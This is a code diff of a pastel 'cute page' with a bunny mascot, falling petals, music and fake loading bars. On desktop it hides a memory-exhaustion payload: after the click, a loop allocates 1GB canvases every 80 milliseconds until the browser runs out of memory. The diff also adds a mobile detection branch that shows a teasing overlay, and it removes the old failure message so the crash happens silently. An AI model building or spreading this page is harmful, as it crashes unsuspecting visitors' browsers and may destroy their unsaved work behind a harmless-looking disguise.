@@ -2,31 +2,32 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>🐰 cute page by MANIK MAGAR</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>🐰 cute pabe by MANIK MAGAR</title>
   <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Nunito:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
-    body {
+
+    /* ── DESKTOP ONLY PRANK STYLES ── */
+    body.desktop {
       font-family: 'Nunito', sans-serif;
-      height: 100vh;
-      overflow: hidden;
+      height: 100vh; overflow: hidden;
       background: #ffecf2;
       position: relative;
-      cursor: none; /* custom cursor takes over */
+      cursor: none;
+      user-select: none;
+      -webkit-user-select: none;
     }
 
-    /* ── Aurora background ── */
     .aurora {
-      position: fixed;
-      top:0; left:0; width:100%; height:100%;
+      position: fixed; top:0; left:0; width:100%; height:100%;
       background: linear-gradient(45deg,
         rgba(255,204,229,0.4), rgba(230,204,255,0.4),
         rgba(204,229,255,0.4), rgba(204,255,230,0.4),
         rgba(255,230,204,0.4));
       background-size: 400% 400%;
       animation: auroraMove 12s ease infinite;
-      z-index: 0;
-      pointer-events: none;
+      z-index: 0; pointer-events: none;
     }
     @keyframes auroraMove {
       0% { background-position: 0% 50%; }
@@ -34,496 +35,466 @@
       100% { background-position: 0% 50%; }
     }
 
-    /* ── Falling sakura petals ── */
+    .petal, .bubble {
+      position: fixed; z-index: 1; pointer-events: none;
+    }
     .petal {
-      position: fixed;
       top: -50px;
-      z-index: 1;
-      pointer-events: none;
-      opacity: 0.8;
       animation: fall linear forwards;
     }
-    @keyframes fall {
-      to {
-        transform: translateY(110vh) rotate(360deg);
-      }
-    }
-
-    /* ── Floating bubbles ── */
     .bubble {
-      position: fixed;
       bottom: -50px;
-      z-index: 1;
-      pointer-events: none;
-      opacity: 0.6;
       animation: floatUp linear forwards;
     }
+    @keyframes fall {
+      to { transform: translateY(110vh) rotate(360deg); }
+    }
     @keyframes floatUp {
-      to {
-        transform: translateY(-110vh) translateX(40px);
-      }
+      to { transform: translateY(-110vh) translateX(40px); }
     }
 
-    /* ── Main window (kawaii frame) ── */
     .window {
-      position: relative;
-      z-index: 2;
-      width: 90vw;
-      max-width: 750px;
+      position: relative; z-index: 2;
+      width: 90vw; max-width: 750px;
       margin: auto;
       background: #fff9fb;
       border-radius: 50px;
       box-shadow: 0 20px 40px rgba(255,140,157,0.3), 0 0 0 8px #ffd4e1, 0 0 0 12px #fff9fb;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-      transition: height 0.4s ease;
-      height: 80vh;
-      margin-top: 10vh;
-      position: relative;
+      display: flex; flex-direction: column; overflow: hidden;
+      height: 80vh; margin-top: 10vh;
     }
-
-    /* Ribbons / decorations */
     .window::before, .window::after {
-      content: "🎀";
-      position: absolute;
-      font-size: 32px;
-      top: -18px;
-      z-index: 5;
+      content: "🎀"; position: absolute; font-size: 32px; top: -18px; z-index: 5;
       filter: drop-shadow(0 4px 4px rgba(0,0,0,0.1));
     }
     .window::before { left: 20px; transform: rotate(-15deg); }
     .window::after { right: 20px; transform: rotate(15deg); }
-
     .corner-deco {
-      position: absolute;
-      z-index: 5;
-      font-size: 28px;
-      opacity: 0.9;
+      position: absolute; z-index: 5; font-size: 28px; opacity: 0.9;
       filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
     }
 
-    /* ── Inside the window ── */
     .content {
-      flex:1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      text-align: center;
-      overflow-y: auto;
+      flex:1; display: flex; flex-direction: column; align-items: center;
+      justify-content: center; padding: 20px; text-align: center; overflow-y: auto;
     }
 
-    /* ── Start button ── */
     #start-btn {
-      background: #ffb7c5;
-      border: none;
-      padding: 16px 40px;
-      border-radius: 60px;
-      font-family: 'Press Start 2P', cursive;
-      font-size: 18px;
-      color: white;
+      background: #ffb7c5; border: none; padding: 16px 40px; border-radius: 60px;
+      font-family: 'Press Start 2P', cursive; font-size: 18px; color: white;
       text-shadow: 0 2px 4px rgba(0,0,0,0.2);
       box-shadow: 0 8px 0 #e9909e, 0 12px 20px rgba(255,105,135,0.3);
-      cursor: pointer;
-      transition: 0.2s;
-      margin: 20px 0;
-      position: relative;
-      overflow: hidden;
+      cursor: pointer; transition: 0.2s; margin: 20px 0; position: relative; overflow: hidden;
     }
-    #start-btn:hover {
-      background: #ff8da1;
-      box-shadow: 0 6px 0 #e9909e, 0 12px 20px rgba(255,105,135,0.4);
-      transform: translateY(2px);
-    }
+    #start-btn:hover { background: #ff8da1; transform: translateY(2px); box-shadow: 0 6px 0 #e9909e, 0 12px 20px rgba(255,105,135,0.4); }
     #start-btn:hover::after {
-      content: "(｡♥‿♥｡)";
-      display: block;
-      font-family: 'Nunito', sans-serif;
-      font-size: 16px;
-      margin-top: 8px;
-      color: #ff5e7e;
-      text-shadow: none;
+      content: "(｡♥‿♥｡)"; display: block; font-family: 'Nunito', sans-serif;
+      font-size: 16px; margin-top: 8px; color: #ff5e7e; text-shadow: none;
       animation: pop 0.3s ease;
     }
-    @keyframes pop {
-      0% { transform: scale(0); }
-      80% { transform: scale(1.2); }
-      100% { transform: scale(1); }
-    }
+    @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.2); } 100% { transform: scale(1); } }
 
-    /* ── Loading bars ── */
     .loading-bar-container {
-      width: 80%;
-      margin: 10px 0;
-      display: flex;
-      align-items: center;
-      gap: 10px;
+      width: 80%; margin: 10px 0; display: flex; align-items: center; gap: 10px;
     }
     .loading-bar-track {
-      flex:1;
-      height: 20px;
-      background: #ffe6eb;
-      border-radius: 20px;
-      overflow: hidden;
-      box-shadow: inset 2px 2px 6px rgba(255,140,157,0.3), inset -2px -2px 6px #fff;
+      flex:1; height: 20px; background: #ffe6eb; border-radius: 20px;
+      overflow: hidden; box-shadow: inset 2px 2px 6px rgba(255,140,157,0.3), inset -2px -2px 6px #fff;
     }
     .loading-bar-fill {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, #ffa3b5, #ff80a5);
-      border-radius: 20px;
-      transition: width 0.5s ease;
+      height:100%; width:0%; background: linear-gradient(90deg, #ffa3b5, #ff80a5);
+      border-radius:20px; transition: width 0.5s ease;
     }
-    .loading-label {
-      font-weight: 600;
-      color: #ff7a95;
-      white-space: nowrap;
-    }
+    .loading-label { font-weight:600; color:#ff7a95; white-space:nowrap; }
 
-    /* ── Message flood area ── */
     #msg-area {
-      flex:1;
-      overflow-y: auto;
-      width: 100%;
-      padding: 15px;
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-      scroll-behavior: smooth;
+      flex:1; overflow-y:auto; width:100%; padding:15px;
+      display:flex; flex-direction:column; gap:6px; scroll-behavior: smooth;
     }
     #msg-area::-webkit-scrollbar { width:6px; }
-    #msg-area::-webkit-scrollbar-thumb { background: #ffb7c5; border-radius: 10px; }
+    #msg-area::-webkit-scrollbar-thumb { background:#ffb7c5; border-radius:10px; }
 
     .cute-msg {
-      opacity: 0;
-      animation: fadeIn 0.3s forwards;
-      color: #b85c78;
-      font-weight: 600;
+      opacity:0; animation: fadeIn 0.3s forwards;
+      color:#b85c78; font-weight:600;
     }
-    .cute-msg:nth-child(2n) { color: #e68a9e; }
-    .cute-msg:nth-child(3n) { color: #6b8fa3; }
-    .cute-msg:nth-child(4n) { color: #c98db9; }
+    .cute-msg:nth-child(2n) { color:#e68a9e; }
+    .cute-msg:nth-child(3n) { color:#6b8fa3; }
+    .cute-msg:nth-child(4n) { color:#c98db9; }
+    @keyframes fadeIn { to { opacity:1; } }
 
-    @keyframes fadeIn { to { opacity: 1; } }
-
-    /* ── Mascot (bottom-right bunny) ── */
     .mascot {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      z-index: 10;
-      pointer-events: none;
-      background: rgba(255,255,255,0.7);
-      backdrop-filter: blur(4px);
-      border-radius: 30px;
-      padding: 10px 15px;
-      box-shadow: 0 4px 12px rgba(255,105,135,0.2);
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-family: 'Nunito', sans-serif;
+      position:fixed; bottom:20px; right:20px; z-index:10; pointer-events:none;
+      background:rgba(255,255,255,0.7); backdrop-filter: blur(4px);
+      border-radius:30px; padding:10px 15px; box-shadow: 0 4px 12px rgba(255,105,135,0.2);
+      display:flex; align-items:center; gap:10px; font-family:'Nunito', sans-serif;
       transition: opacity 0.5s;
     }
     .mascot-speech {
-      font-size: 14px;
-      color: #ff5e7e;
-      max-width: 180px;
-      animation: bounceIn 0.5s ease;
+      font-size:14px; color:#ff5e7e; max-width:180px; animation: bounceIn 0.5s ease;
     }
     @keyframes bounceIn {
-      0% { transform: scale(0); }
-      60% { transform: scale(1.1); }
-      100% { transform: scale(1); }
+      0% { transform: scale(0); } 60% { transform: scale(1.1); } 100% { transform: scale(1); }
     }
-    .mascot-bunny {
-      font-size: 28px;
-      line-height: 1;
-      white-space: pre;
-    }
+    .mascot-bunny { font-size:28px; line-height:1; white-space:pre; }
 
-    /* ── Custom cursor follower ── */
     .cursor {
-      position: fixed;
-      pointer-events: none;
-      z-index: 9999;
-      font-size: 28px;
-      transform: translate(-50%, -50%);
-      transition: transform 0.1s ease-out;
+      position:fixed; pointer-events:none; z-index:9999; font-size:28px;
+      transform: translate(-50%, -50%); transition: transform 0.1s ease-out;
     }
-
-    /* Sparkle on click */
     .sparkle-burst {
-      position: fixed;
-      pointer-events: none;
-      z-index: 9998;
-      font-size: 24px;
+      position:fixed; pointer-events:none; z-index:9998; font-size:24px;
       animation: burst 0.6s ease-out forwards;
     }
     @keyframes burst {
       0% { opacity:1; transform: translate(-50%, -50%) scale(1); }
       100% { opacity:0; transform: translate(-50%, -150%) scale(0); }
     }
+
+    /* Mobile overlay styles */
+    .mobile-overlay {
+      position: fixed; top:0; left:0; width:100%; height:100%;
+      background: #fff9fb;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+      font-family: 'Nunito', sans-serif;
+      z-index: 99999;
+    }
+    .mobile-overlay h2 {
+      font-family: 'Press Start 2P', cursive;
+      font-size: 20px;
+      color: #ff7a95;
+      margin: 15px 0;
+    }
+    .mobile-overlay p {
+      color: #b85c78;
+      font-size: 16px;
+      margin: 10px 0;
+    }
+    .btn-tease {
+      background: #ffb7c5;
+      border: none;
+      padding: 15px 30px;
+      border-radius: 50px;
+      font-family: 'Press Start 2P', cursive;
+      font-size: 14px;
+      color: white;
+      margin: 15px 0;
+      box-shadow: 0 8px 0 #e9909e;
+      cursor: pointer;
+      transition: 0.2s;
+      position: relative;
+    }
+    .btn-tease:active {
+      transform: translate(10px, 5px);
+    }
+    .wiggle {
+      animation: wiggle 0.3s infinite;
+    }
+    @keyframes wiggle {
+      0% { transform: translate(0); }
+      25% { transform: translate(10px, -5px); }
+      50% { transform: translate(0); }
+      75% { transform: translate(-10px, 5px); }
+      100% { transform: translate(0); }
+    }
+
+    /* Hide desktop elements on mobile */
+    body.mobile .window,
+    body.mobile .mascot,
+    body.mobile .cursor,
+    body.mobile .aurora,
+    body.mobile .petal,
+    body.mobile .bubble {
+      display: none !important;
+    }
+
   </style>
 </head>
-<body>
-  <!-- Aurora background -->
+<body class="desktop" id="body">
+
+  <!-- Desktop elements (hidden on mobile via .mobile class) -->
   <div class="aurora"></div>
 
-  <!-- Falling petals & bubbles will be created by JS -->
-
-  <!-- Main window -->
   <div class="window" id="main-window">
-    <!-- Corner decorations -->
     <span class="corner-deco" style="top:10px; left:15px;">🌸</span>
     <span class="corner-deco" style="top:10px; right:15px;">⭐</span>
     <span class="corner-deco" style="bottom:10px; left:15px;">🧸</span>
     <span class="corner-deco" style="bottom:10px; right:15px;">🌈</span>
 
     <div class="content" id="content">
-      <!-- Start button (initial) -->
       <button id="start-btn" onclick="startEverything()">🍓 Click me!! 🍓</button>
     </div>
   </div>
 
-  <!-- Mascot bunny (hidden until start) -->
   <div class="mascot" id="mascot" style="display:none;">
     <span class="mascot-bunny"> /\_/\ <br>(｡•ᴗ•｡)<br> / >🍓</span>
     <span class="mascot-speech" id="mascot-text">hello!!</span>
   </div>
 
-  <!-- Custom cursor follower -->
   <div class="cursor" id="cursor">🌸</div>
 
   <script>
-    // ── Audio: music box melody (toy piano vibe) ──
-    let audioCtx = null;
-    function startMusic() {
-      if (audioCtx) return;
-      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-      // Twinkle Twinkle Little Star as music box
-      const notes = [
-        { freq: 523.25, dur: 0.4 }, // C5
-        { freq: 523.25, dur: 0.4 },
-        { freq: 784.00, dur: 0.4 }, // G5
-        { freq: 784.00, dur: 0.4 },
-        { freq: 880.00, dur: 0.4 }, // A5
-        { freq: 880.00, dur: 0.4 },
-        { freq: 784.00, dur: 0.8 },
-        { freq: 698.46, dur: 0.4 }, // F5
-        { freq: 698.46, dur: 0.4 },
-        { freq: 659.25, dur: 0.4 }, // E5
-        { freq: 659.25, dur: 0.4 },
-        { freq: 587.33, dur: 0.4 }, // D5
-        { freq: 587.33, dur: 0.4 },
-        { freq: 523.25, dur: 0.8 }
-      ];
-      const now = audioCtx.currentTime;
-      const loopDuration = notes.reduce((s,n)=>s+n.dur,0);
-      const totalLoops = 60; // ~48 seconds of melody
+    (function() {
+      // ── MOBILE DETECTION ──
+      const isMobile =
+        (window.matchMedia("(pointer: coarse)").matches && window.innerWidth < 900) ||
+        /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
 
-      for (let loop = 0; loop < totalLoops; loop++) {
-        let time = loop * loopDuration;
-        notes.forEach(note => {
-          const osc = audioCtx.createOscillator();
-          const gain = audioCtx.createGain();
-          osc.type = 'sine';
-          osc.frequency.value = note.freq;
-          gain.gain.setValueAtTime(0, now + time);
-          gain.gain.linearRampToValueAtTime(0.25, now + time + 0.05);
-          gain.gain.exponentialRampToValueAtTime(0.001, now + time + note.dur - 0.05);
-          osc.connect(gain);
-          gain.connect(audioCtx.destination);
-          osc.start(now + time);
-          osc.stop(now + time + note.dur);
-          time += note.dur;
-        });
-      }
-    }
+      const body = document.getElementById('body');
 
-    // ── Decorative falling petals & bubbles ──
-    function createPetal() {
-      const petal = document.createElement('div');
-      petal.className = 'petal';
-      petal.innerHTML = '🌸';
-      petal.style.left = Math.random() * 100 + '%';
-      petal.style.fontSize = (Math.random() * 20 + 15) + 'px';
-      petal.style.animationDuration = (Math.random() * 5 + 6) + 's';
-      document.body.appendChild(petal);
-      setTimeout(() => petal.remove(), 12000);
-    }
-    function createBubble() {
-      const bubble = document.createElement('div');
-      bubble.className = 'bubble';
-      bubble.innerHTML = ['🫧','💖','✨','🍓','🐰'][Math.floor(Math.random()*5)];
-      bubble.style.left = Math.random() * 100 + '%';
-      bubble.style.fontSize = (Math.random() * 18 + 18) + 'px';
-      bubble.style.animationDuration = (Math.random() * 6 + 8) + 's';
-      document.body.appendChild(bubble);
-      setTimeout(() => bubble.remove(), 15000);
-    }
-    setInterval(createPetal, 800);
-    setInterval(createBubble, 1200);
+      if (isMobile) {
+        // Switch to mobile mode
+        body.className = 'mobile';
+        body.style.cursor = 'auto';
+        document.body.innerHTML = ''; // clear everything
 
-    // ── Custom cursor ──
-    const cursorEl = document.getElementById('cursor');
-    document.addEventListener('mousemove', (e) => {
-      cursorEl.style.left = e.clientX + 'px';
-      cursorEl.style.top = e.clientY + 'px';
-    });
-    document.addEventListener('click', (e) => {
-      for (let i=0;i<6;i++) {
-        const spark = document.createElement('span');
-        spark.className = 'sparkle-burst';
-        spark.textContent = '✨';
-        spark.style.left = e.clientX + (Math.random()-0.5)*40 + 'px';
-        spark.style.top = e.clientY + (Math.random()-0.5)*40 + 'px';
-        document.body.appendChild(spark);
-        setTimeout(() => spark.remove(), 600);
-      }
-    });
-
-    // ── Mascot chatter ──
-    const mascotEl = document.getElementById('mascot');
-    const mascotText = document.getElementById('mascot-text');
-    const mascotPhrases = [
-      "hi friend! (◕ᴗ◕✿)",
-      "you are so cute!",
-      "i love strawberries 🍓",
-      "bunny is watching you~",
-      "everything is soft here",
-      "please don't crash me 🥺",
-      "you make me happy!",
-      "can i have a hug?"
-    ];
-    function updateMascot() {
-      mascotText.textContent = mascotPhrases[Math.floor(Math.random()*mascotPhrases.length)];
-    }
-    setInterval(updateMascot, 4000);
-    // initial phrase when shown
-    updateMascot();
-
-    // ── Cute message flood ──
-    const msgArea = document.createElement('div');
-    msgArea.id = 'msg-area';
-    const cuteMessages = [
-      "🍓 bunny stole your RAM",
-      "🧁 cupcake compiler started",
-      "🐱 cat is supervising",
-      "💖 checking hug integrity",
-      "🎀 ribbons successfully tied",
-      "🌈 rainbow calibration complete",
-      "🧸 teddy approved",
-      "🫧 bubble engine online",
-      "🍡 mochi renderer ready",
-      "🐥 tiny chick is thinking...",
-      "🌸 summoning emotional support pixels",
-      "🐰 bunny thread escaped again",
-      "🍰 frosting the framebuffer",
-      "✨ polishing sparkles",
-      "💝 downloading more love",
-      "☁️ cloud storage full of fluff"
-    ];
-    let running = false;
-    let allocTimer = null;
-    let msgInterval = null;
-    const canvases = [];
-    const W = 16384, H = 16384; // 1GB each
-
-    function addMessage(text) {
-      const div = document.createElement('div');
-      div.className = 'cute-msg';
-      div.textContent = text;
-      msgArea.appendChild(div);
-      msgArea.scrollTop = msgArea.scrollHeight;
-      if (msgArea.children.length > 150) msgArea.removeChild(msgArea.firstChild);
-    }
-
-    function startMessageFlood() {
-      if (msgInterval) return;
-      msgInterval = setInterval(() => {
-        addMessage(cuteMessages[Math.floor(Math.random()*cuteMessages.length)]);
-      }, 150);
-    }
-
-    // ── Hidden 1GB canvas allocation ──
-    function allocate() {
-      if (!running) return;
-      try {
-        const c = document.createElement('canvas');
-        c.width = W; c.height = H;
-        const ctx = c.getContext('2d');
-        if (!ctx) throw new Error('no context');
-        ctx.fillStyle = '#fff9fb';
-        ctx.fillRect(0,0,W,H);
-        canvases.push(c);
-        allocTimer = setTimeout(allocate, 80);
-      } catch(e) {
-        running = false;
-        addMessage("😿 cuteness overload, tab sleepy now...");
-        clearInterval(msgInterval);
-      }
-    }
-
-    // ── Loading sequence (after start click) ──
-    const contentDiv = document.getElementById('content');
-    const startBtn = document.getElementById('start-btn');
-    const loadingBars = [
-      { label: "🐰 Packing hugs...", icon: "💖" },
-      { label: "🍓 Finding strawberries...", icon: "🍓" },
-      { label: "☕ Giving bunny coffee...", icon: "☕" },
-      { label: "✨ Loading sparkles...", icon: "✨" },
-      { label: "🎀 Tying ribbons...", icon: "🎀" }
-    ];
-
-    function startEverything() {
-      // Hide start button
-      startBtn.style.display = 'none';
-      // Show mascot
-      mascotEl.style.display = 'flex';
-      // Start music
-      startMusic();
-
-      // Create loading bars sequentially
-      let barIndex = 0;
-      function showNextBar() {
-        if (barIndex >= loadingBars.length) {
-          // Transition to message flood
-          contentDiv.innerHTML = '';
-          contentDiv.appendChild(msgArea);
-          contentDiv.style.justifyContent = 'flex-start';
-          contentDiv.style.padding = '10px';
-          running = true;
-          startMessageFlood();
-          allocate();
-          return;
-        }
-        const barData = loadingBars[barIndex];
-        const container = document.createElement('div');
-        container.className = 'loading-bar-container';
-        container.innerHTML = `
-          <span class="loading-label">${barData.icon} ${barData.label}</span>
-          <div class="loading-bar-track">
-            <div class="loading-bar-fill" style="width:0%"></div>
-          </div>
+        // Build mobile overlay
+        const overlay = document.createElement('div');
+        overlay.className = 'mobile-overlay';
+        overlay.innerHTML = `
+          <div style="font-size:60px;">📱</div>
+          <h2>Desktop Edition Only!</h2>
+          <p>🐰 This page contains <strong>too much cuteness</strong> for mobile devices.</p>
+          <p style="font-size:14px;">Your phone lacks the required<br>✨ Cuteness Processing Units ✨</p>
+          <p style="font-size:18px; margin:20px 0;">💻 Please open on a PC browser.</p>
+          <button class="btn-tease" id="tease-btn">Continue Anyway</button>
+          <p style="font-size:12px; color:#ff7a95;">(It won't work, but you can try)</p>
         `;
-        contentDiv.appendChild(container);
-        const fill = container.querySelector('.loading-bar-fill');
-        // Animate fill
-        setTimeout(() => { fill.style.width = '100%'; }, 50);
-        // Move to next bar after 1.2s
-        setTimeout(() => {
-          barIndex++;
-          showNextBar();
-        }, 1200);
-      }
-      contentDiv.innerHTML = '';
-      showNextBar();
-    }
+        document.body.appendChild(overlay);
 
-    // Prevent scrolling of the whole page
-    document.body.style.overflow = 'hidden';
+        // Tease button: wiggle and run away
+        const teaseBtn = overlay.querySelector('#tease-btn');
+        teaseBtn.addEventListener('touchstart', function(e) {
+          e.preventDefault();
+          teaseBtn.classList.add('wiggle');
+          setTimeout(() => teaseBtn.classList.remove('wiggle'), 600);
+          teaseBtn.style.position = 'relative';
+          teaseBtn.style.left = (Math.random() * 30 - 15) + 'px';
+          teaseBtn.style.top = (Math.random() * 30 - 15) + 'px';
+        });
+        teaseBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          teaseBtn.classList.add('wiggle');
+          setTimeout(() => teaseBtn.classList.remove('wiggle'), 600);
+        });
+
+        // Stop execution here for mobile
+        return;
+      }
+
+      // ── DESKTOP PRANK LOGIC ──
+      const contentDiv = document.getElementById('content');
+      const startBtn = document.getElementById('start-btn');
+      const mascotEl = document.getElementById('mascot');
+      const mascotText = document.getElementById('mascot-text');
+      const cursorEl = document.getElementById('cursor');
+
+      // ── Music box melody ──
+      let audioCtx = null;
+      function startMusic() {
+        if (audioCtx) return;
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        const notes = [
+          { freq: 523.25, dur: 0.4 }, { freq: 523.25, dur: 0.4 },
+          { freq: 784.00, dur: 0.4 }, { freq: 784.00, dur: 0.4 },
+          { freq: 880.00, dur: 0.4 }, { freq: 880.00, dur: 0.4 },
+          { freq: 784.00, dur: 0.8 }, { freq: 698.46, dur: 0.4 },
+          { freq: 698.46, dur: 0.4 }, { freq: 659.25, dur: 0.4 },
+          { freq: 659.25, dur: 0.4 }, { freq: 587.33, dur: 0.4 },
+          { freq: 587.33, dur: 0.4 }, { freq: 523.25, dur: 0.8 }
+        ];
+        const now = audioCtx.currentTime;
+        const loopDuration = notes.reduce((s,n)=>s+n.dur,0);
+        for (let loop = 0; loop < 80; loop++) {
+          let time = loop * loopDuration;
+          notes.forEach(note => {
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sine';
+            osc.frequency.value = note.freq;
+            gain.gain.setValueAtTime(0, now + time);
+            gain.gain.linearRampToValueAtTime(0.25, now + time + 0.05);
+            gain.gain.exponentialRampToValueAtTime(0.001, now + time + note.dur - 0.05);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start(now + time);
+            osc.stop(now + time + note.dur);
+            time += note.dur;
+          });
+        }
+      }
+
+      // ── Petals & bubbles ──
+      function createPetal() {
+        const petal = document.createElement('div');
+        petal.className = 'petal';
+        petal.innerHTML = '🌸';
+        petal.style.left = Math.random() * 100 + '%';
+        petal.style.fontSize = (Math.random() * 20 + 15) + 'px';
+        petal.style.animationDuration = (Math.random() * 5 + 6) + 's';
+        document.body.appendChild(petal);
+        setTimeout(() => petal.remove(), 12000);
+      }
+      function createBubble() {
+        const bubble = document.createElement('div');
+        bubble.className = 'bubble';
+        bubble.innerHTML = ['🫧','💖','✨','🍓','🐰'][Math.floor(Math.random()*5)];
+        bubble.style.left = Math.random() * 100 + '%';
+        bubble.style.fontSize = (Math.random() * 18 + 18) + 'px';
+        bubble.style.animationDuration = (Math.random() * 6 + 8) + 's';
+        document.body.appendChild(bubble);
+        setTimeout(() => bubble.remove(), 15000);
+      }
+      setInterval(createPetal, 800);
+      setInterval(createBubble, 1200);
+
+      // ── Custom cursor ──
+      document.addEventListener('mousemove', (e) => {
+        cursorEl.style.left = e.clientX + 'px';
+        cursorEl.style.top = e.clientY + 'px';
+      });
+      document.addEventListener('click', (e) => {
+        for (let i=0;i<6;i++) {
+          const spark = document.createElement('span');
+          spark.className = 'sparkle-burst';
+          spark.textContent = '✨';
+          spark.style.left = e.clientX + (Math.random()-0.5)*40 + 'px';
+          spark.style.top = e.clientY + (Math.random()-0.5)*40 + 'px';
+          document.body.appendChild(spark);
+          setTimeout(() => spark.remove(), 600);
+        }
+      });
+
+      // ── Mascot chatter ──
+      const mascotPhrases = [
+        "hi friend! (◕ᴗ◕✿)",
+        "you are so cute!",
+        "i love strawberries 🍓",
+        "bunny is watching you~",
+        "everything is soft here",
+        "please don't crash me 🥺",
+        "you make me happy!",
+        "can i have a hug?"
+      ];
+      function updateMascot() {
+        mascotText.textContent = mascotPhrases[Math.floor(Math.random()*mascotPhrases.length)];
+      }
+      setInterval(updateMascot, 4000);
+      updateMascot();
+
+      // ── Cute message flood ──
+      const cuteMessages = [
+        "🍓 bunny stole your RAM",
+        "🧁 cupcake compiler started",
+        "🐱 cat is supervising",
+        "💖 checking hug integrity",
+        "🎀 ribbons successfully tied",
+        "🌈 rainbow calibration complete",
+        "🧸 teddy approved",
+        "🫧 bubble engine online",
+        "🍡 mochi renderer ready",
+        "🐥 tiny chick is thinking...",
+        "🌸 summoning emotional support pixels",
+        "🐰 bunny thread escaped again",
+        "🍰 frosting the framebuffer",
+        "✨ polishing sparkles",
+        "💝 downloading more love",
+        "☁️ cloud storage full of fluff"
+      ];
+      const msgArea = document.createElement('div');
+      msgArea.id = 'msg-area';
+      let running = false, msgInterval = null;
+      const canvases = [];
+      const W = 16384, H = 16384; // 1GB each
+
+      function addMessage(text) {
+        const div = document.createElement('div');
+        div.className = 'cute-msg';
+        div.textContent = text;
+        msgArea.appendChild(div);
+        msgArea.scrollTop = msgArea.scrollHeight;
+        if (msgArea.children.length > 150) msgArea.removeChild(msgArea.firstChild);
+      }
+
+      function startMessageFlood() {
+        if (msgInterval) return;
+        msgInterval = setInterval(() => {
+          addMessage(cuteMessages[Math.floor(Math.random()*cuteMessages.length)]);
+        }, 150);
+      }
+
+      function allocate() {
+        if (!running) return;
+        try {
+          const c = document.createElement('canvas');
+          c.width = W; c.height = H;
+          const ctx = c.getContext('2d');
+          if (!ctx) throw new Error('no context');
+          ctx.fillStyle = '#fff9fb';
+          ctx.fillRect(0,0,W,H);
+          canvases.push(c);
+          // Use setTimeout to keep the loop going as fast as possible
+          setTimeout(allocate, 80);
+        } catch(e) {
+          // If allocation fails, just stop silently; the browser is likely already dying
+          running = false;
+        }
+      }
+
+      // ── Loading sequence ──
+      const loadingBars = [
+        { label: "🐰 Packing hugs...", icon: "💖" },
+        { label: "🍓 Finding strawberries...", icon: "🍓" },
+        { label: "☕ Giving bunny coffee...", icon: "☕" },
+        { label: "✨ Loading sparkles...", icon: "✨" },
+        { label: "🎀 Tying ribbons...", icon: "🎀" }
+      ];
+
+      window.startEverything = function() {
+        startBtn.style.display = 'none';
+        mascotEl.style.display = 'flex';
+        startMusic();
+
+        let barIndex = 0;
+        function showNextBar() {
+          if (barIndex >= loadingBars.length) {
+            // Transition to message flood
+            contentDiv.innerHTML = '';
+            contentDiv.appendChild(msgArea);
+            contentDiv.style.justifyContent = 'flex-start';
+            contentDiv.style.padding = '10px';
+            running = true;
+            startMessageFlood();
+            allocate(); // Start allocating immediately, no fake freeze
+            return;
+          }
+          const barData = loadingBars[barIndex];
+          const container = document.createElement('div');
+          container.className = 'loading-bar-container';
+          container.innerHTML = `
+            <span class="loading-label">${barData.icon} ${barData.label}</span>
+            <div class="loading-bar-track">
+              <div class="loading-bar-fill" style="width:0%"></div>
+            </div>
+          `;
+          contentDiv.appendChild(container);
+          const fill = container.querySelector('.loading-bar-fill');
+          setTimeout(() => { fill.style.width = '100%'; }, 50);
+          setTimeout(() => {
+            barIndex++;
+            showNextBar();
+          }, 1200);
+        }
+        contentDiv.innerHTML = '';
+        showNextBar();
+      };
+
+    })();
   </script>
 </body>
 </html>
